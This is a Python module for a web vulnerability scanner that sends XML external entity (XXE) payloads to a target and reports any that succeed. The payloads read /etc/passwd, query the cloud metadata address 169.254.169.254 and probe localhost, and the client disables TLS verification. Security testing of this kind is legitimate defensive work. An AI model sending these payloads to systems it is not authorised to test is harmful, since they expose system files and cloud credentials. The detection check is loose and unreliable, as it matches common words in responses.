import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


OOB_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><root>test</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/">%xxe;]><root>test</root>',
]


class XmlExternalEntityCheck(BaseCheck):
    name = "active_xml_external_entity"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for payload in OOB_XXE_PAYLOADS:
                modified = self._inject_body(base_request, payload)
                try:
                    resp = await client.request(**modified)
                    if "root" in resp.text or "file" in resp.text or "localhost" in resp.text:
                        results.append(CheckResult(
                            triggered=True,
                            severity="critical",
                            title="XXE (OOB) detected",
                            description="XML External Entity injection with OOB exfiltration detected.",
                            evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                            remediation="Disable XML external entity processing. Use JSON or other less complex data formats.",
                            cwe="CWE-611",
                        ))
                except Exception:
                    continue
        return results

    def _inject_body(self, base: dict, payload: str) -> dict:
        import copy
        req = copy.deepcopy(base)
        req["content"] = payload
        req["headers"] = {**req.get("headers", {}), "Content-Type": "application/xml"}
        return req
